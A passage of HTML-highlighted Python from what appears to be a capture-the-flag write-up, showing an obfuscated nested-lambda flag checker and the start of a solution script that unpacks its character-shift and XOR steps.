style=\"color:#6F42C1;--shiki-dark:#C5E478\">print\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _41\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _42\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_42\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">_39\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _43\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _44\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_44\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">_27\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _45\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _46\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_46\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_43\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">_45\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">))\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _47\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _48\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_48\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">_35\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _49\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _50\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_50\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_47\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">_49\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">))\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _51\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _52\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_52\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Correct FLAG!\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _53\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _54\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_54\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Incorrect\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _55\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _56\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_56\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_41\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">_53 \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">if\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> _51 \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">else\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> _55\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">))\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _57\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _58\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: _58\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)))))))))))))))))))))))))))\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Wow. Very messy. But don’t get scared. We can simply just split this into smaller parts, and reverse the operations to get the flag.\u003C/p>\n\u003Cp>Here’s the solution script:\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">import\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> sys\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">sys\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">setrecursionlimit\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">10000000\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _0\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_0\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">input\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _1\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _2\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_2\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Enter the flag: \u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _3\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _4\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_4\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_1\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">_3\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">))\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _5\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _6\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_6\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">''\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">.join\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">#\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _7\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _8\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_8\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _9\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_7\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">chr\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">ord\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">c\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> +\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 12\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\"> for\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> c \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">in\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> _9)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">))\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _10\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _11\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_11\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">''\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">.join\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _12\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _13\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_13\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">chr\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">ord\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">c\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> -\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 3\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\"> for\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> c \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">in\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> _10\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">_5\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _14\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _15\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_15\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_12\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">_14\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">))\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _16\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _17\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_17\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">''\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">.join\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _18\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _19\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_19\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _20\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_18\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">chr\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">123\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> ^\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\"> ord\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">c\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">))\u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\"> for\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> c \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">in\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> _20)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">))\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _21\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _22\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_22\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">''\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">.join\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan 